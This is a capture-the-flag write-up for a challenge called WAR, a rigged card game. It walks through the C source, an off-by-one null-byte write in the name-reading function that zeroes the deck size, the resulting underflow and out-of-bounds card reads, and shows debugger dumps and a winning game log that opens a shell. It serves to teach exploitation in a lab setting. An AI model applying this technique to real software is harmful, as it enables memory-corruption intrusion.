### Solved by Swappage

WAR was a binary exploitation (sort of) challenge running a modified version of the WAR card game.

- the player was given 100 coins and 26 cards
- every round the player bets an amount of coins
- if the player reaches 500 coins the game ends, player wins and flag is captured.

the only problem: there is mathematically no way to win, so you have to find a way to cheat, somehow.

the strength of this challenge was that it was very disguising and leading into the wrong direction, really.
i spent quite some time trying to figure out if there was a bug in the way cards were shuffled and given to both the player and CPU, but in the end it turned out the bug, and the challenge itself, was nothing about that.

anyway, we were given the source, and this was probably the biggest issue for me, as i spent a lot of time looking into possible bugs and lured by author comments..

let's take a quick look at it


```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define NAMEBUFFLEN 32
#define BETBUFFLEN 8

typedef struct _card{
    char suit;
    char value;
} card;

typedef struct _deck{
    size_t deckSize;
    size_t top;
    card cards[52];
} deck;

typedef struct _player{
    int money;
    deck playerCards;
} player;

typedef struct _gameState{
  int playerMoney;
  player ctfer;
  char name[NAMEBUFFLEN];
  size_t deckSize;
  player opponent;
} gameState;

gameState gameData;

//Shuffles the deck
//Make sure to call srand() before!
void shuffle(deck * inputDeck){
    card temp;
    size_t indexA, indexB;
    size_t deckSize = inputDeck->deckSize;
    for(unsigned int i=0; i < 1000; i++){
        indexA = rand() % deckSize;
        indexB = rand() % deckSize;
        temp = inputDeck->cards[indexA];
        inputDeck->cards[indexA] = inputDeck->cards[indexB];
        inputDeck->cards[indexB] = temp;
    }
}

//Checks if a card is in invalid range
int checkInvalidCard(card * inputCard){
    if(inputCard->suit > 4 || inputCard->value > 14){
        return 1;
    }
    return 0;
}

//Reads input from user, and properly terminates the string
unsigned int readInput(char * buff, unsigned int len){
    size_t count = 0;
    char c;
    while((c = getchar()) != '\n' && c != EOF){
        if(count < (len-1)){
            buff[count] = c;
            count++;
        }
    }
    buff[count+1] = '\x00';
    return count;
}

//Builds the deck for each player.
//Good luck trying to win ;)
void buildDecks(player * ctfer, player * opponent){
    for(size_t j = 0; j < 6; j++){
        for(size_t i = 0; i < 4; i++){
            ctfer->playerCards.cards[j*4 + i].suit = i;
            ctfer->playerCards.cards[j*4 + i].value = j+2;
        }
    }
    for(size_t j = 0; j < 6; j++){
        for(size_t i = 0; i < 4; i++){
            opponent->playerCards.cards[j*4 + i].suit = i;
            opponent->playerCards.cards[j*4 + i].value = j+9;
        }
    }
    ctfer->playerCards.cards[24].suit = 0;
    ctfer->playerCards.cards[24].value = 8;
    ctfer->playerCards.cards[25].suit = 1;
    ctfer->playerCards.cards[25].value = 8;
    opponent->playerCards.cards[24].suit = 2;
    opponent->playerCards.cards[24].value = 8;
    opponent->playerCards.cards[25].suit = 3;
    opponent->playerCards.cards[25].value = 8;

    ctfer->playerCards.deckSize = 26;
    ctfer->playerCards.top = 0;
    opponent->playerCards.deckSize = 26;
    opponent->playerCards.top = 0;
}

int main(int argc, char**argv){

    card * oppCard;
    card * playCard;
    memset(&gameData, 0, sizeof(gameData));
    gameData.playerMoney = 100;
    int bet;

    buildDecks(&gameData.ctfer, &gameData.opponent);
    srand(time(NULL));//Not intended to be cryptographically strong

    shuffle(&gameData.ctfer.playerCards);
    shuffle(&gameData.opponent.playerCards);

    setbuf(stdout, NULL);

    //Set to be the smaller of the two decks.
    gameData.deckSize = gameData.ctfer.playerCards.deckSize > gameData.opponent.playerCards.deckSize
		 ? gameData.opponent.playerCards.deckSize : gameData.ctfer.playerCards.deckSize;

    printf("Welcome to the WAR card game simulator. Work in progress...\n");
    printf("Cards don't exchange hands after each round, but you should be able to win without that,right?\n");
    printf("Please enter your name: \n");
    memset(gameData.name,0,NAMEBUFFLEN);
    if(!readInput(gameData.name,NAMEBUFFLEN)){
        printf("Read error. Exiting.\n");
        exit(-1);
    }
    printf("Welcome %s\n", gameData.name);
    while(1){
        size_t playerIndex = gameData.ctfer.playerCards.top;
        size_t oppIndex = gameData.opponent.playerCards.top;
        oppCard = &gameData.opponent.playerCards.cards[oppIndex];
        playCard = &gameData.ctfer.playerCards.cards[playerIndex];
        printf("You have %d coins.\n", gameData.playerMoney);
        printf("How much would you like to bet?\n");
        memset(betStr,0,BETBUFFLEN);
        if(!readInput(betStr,BETBUFFLEN)){
            printf("Read error. Exiting.\n");
            exit(-1);
        };
        bet = atoi(betStr);
        printf("you bet %d.\n",bet);
        if(!bet){
            printf("Invalid bet\n");
            continue;
        }
        if(bet < 0){
            printf("No negative betting for you! What do you think this is, a ctf problem?\n");
           continue;
        }
        if(bet > gameData.playerMoney){
            printf("You don't have that much.\n");
            continue;
        }
        printf("The opponent has a %d of suit %d.\n", oppCard->value, oppCard->suit);
        printf("You have a %d of suit %d.\n", playCard->value, playCard->suit);
        if((playCard->value * 4 + playCard->suit) > (oppCard->value * 4 + playCard->suit)){
            printf("You won? Hmmm something must be wrong...\n");
            if(checkInvalidCard(playCard)){
                printf("Cheater. That's not actually a valid card.\n");
            }else{
                printf("You actually won! Nice job\n");           
                gameData.playerMoney += bet;
            }
        }else{
            printf("You lost! :(\n");
            gameData.playerMoney -= bet;
        }
        gameData.ctfer.playerCards.top++;
        gameData.opponent.playerCards.top++;
        if(gameData.playerMoney <= 0){
            printf("You are out of coins. Game over.\n");
            exit(0);
        }else if(gameData.playerMoney > 500){
            printf("You won the game! That's real impressive, seeing as the deck was rigged...\n");
	        system("/bin/sh -i");
            exit(0);
        }

        //TODO: Implement card switching hands. Cheap hack here for playability
        gameData.deckSize--;
        if(gameData.deckSize == 0){
            printf("All card used. Card switching will be implemented in v1.0, someday.\n");
            exit(0);
        }
        printf("\n");
	    fflush(stdout);
    };

    return 0;
}
```

what the program does is allocating some game structures as global variables (more on this later),
generate an insecure random number, apply some permutations on the player decks and handle the game.

if we carefully look at the function responsible of creating the two decks for the player and the CPU, we can understand that the player has absolutely no chance of winning, despite the random being predictable, knowing what cards the CPU has doesn't give any advantage to the player because:

- the highest card value for the player is 8
- the lower card value for the CPU is 8
- draw means a loss for the player.

so, where is the bug?

there are a couple of bugs actually, but the most important one stands in the readInput() function

```c
unsigned int readInput(char * buff, unsigned int len){
    size_t count = 0;
    char c;
    while((c = getchar()) != '\n' && c != EOF){
        if(count < (len-1)){
            buff[count] = c;
            count++;
        }
    }
    buff[count+1] = '\x00';
    return count;
}
```

as we can see, the function attempts to apply some boundary restrictions on the buffer, but badly fails because it appends a null byte to the end of the buffer at buff[count+1].
Since this function is used to read the player name, if the player provides a username of exactly NAMEBBUFFER (32) len, we face an off-by-one condition, where we can overwrite adiacent data to the username with 0x00.

Because of how data is stored in memory, and how the structures are made, char name[32] is positioned right before deckSize in the __gameState structure; this means we can tamper the size of the deck used during the game, setting it to 0.

The other bug, that allows us to win is in the way the program checks if the player or the CPU are out of card.

 ```c
 gameData.deckSize--;
 if(gameData.deckSize == 0){
     printf("All card used. Card switching will be implemented in v1.0, someday.\n");
     exit(0);
 }
 ```

 Here the game doesn't take in account the possibility of the deck size being a negative number.

Since the deck size is decreased in the first place and then checked, if we overflow the name buffer and cause the deck to be 0, after the first turn, before the check, the deck size is decremented by 1 and becomes a negative number; this way the game never ends and because of how the cards are read from memory, we will end up reading card values from other memory locations.

By looking at it in the debugger

here is how the memory looks like right after the username is written to memory.

    pwndbg> x/16gx 0x601808
    0x601808 <gameData+136>:	0x4141414141414141	0x4141414141414141
    0x601818 <gameData+152>:	0x4141414141414141	0x0041414141414141
    0x601828 <gameData+168>:	0x0000000000000000	0x0000000000000000
    0x601838 <gameData+184>:	0x000000000000001a	0x0000000000000000
    0x601848 <gameData+200>:	0x09000e000d000a00	0x0a010d010b010e03
    0x601858 <gameData+216>:	0x0d030b030e010903	0x0902080208030b00
    0x601868 <gameData+232>:	0x0c020c010b020a02	0x09010d020a030e02
    0x601878 <gameData+248>:	0x000000000c000c03	0x0000000000000000

and here is what happens after we have made our first bet.

    0x601808 <gameData+136>:	0x4141414141414141	0x4141414141414141
    0x601818 <gameData+152>:	0x4141414141414141	0x0041414141414141
    0x601828 <gameData+168>:	0xffffffffffffffff	0x0000000000000000
    0x601838 <gameData+184>:	0x000000000000001a	0x0000000000000001
    0x601848 <gameData+200>:	0x09000e000d000a00	0x0a010d010b010e03
    0x601858 <gameData+216>:	0x0d030b030e010903	0x0902080208030b00
    0x601868 <gameData+232>:	0x0c020c010b020a02	0x09010d020a030e02
    0x601878 <gameData+248>:	0x000000000c000c03	0x0000000000000000

as we can see the deck size has been thecreased and is now 0xffffffffffffffff,
from here on we can continue betting 1 coin untill we start reaching a point where our cards values are read from the CPU deck (as the indexes increase), and the CPU deck data is read from a sled of null bytes.

    ...
    you bet 33.
    The opponent has a 0 of suit 0.
    You have a 14 of suit 0.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 66 coins.
    How much would you like to bet?
    66
    you bet 66.
    The opponent has a 0 of suit 0.
    You have a 9 of suit 0.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 132 coins.
    How much would you like to bet?
    132
    you bet 132.
    The opponent has a 0 of suit 0.
    You have a 14 of suit 3.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 264 coins.
    How much would you like to bet?
    264
    you bet 264.
    The opponent has a 0 of suit 0.
    You have a 11 of suit 1.
    You won? Hmmm something must be wrong...
    You actually won! Nice job
    You won the game! That's real impressive, seeing as the deck was rigged...
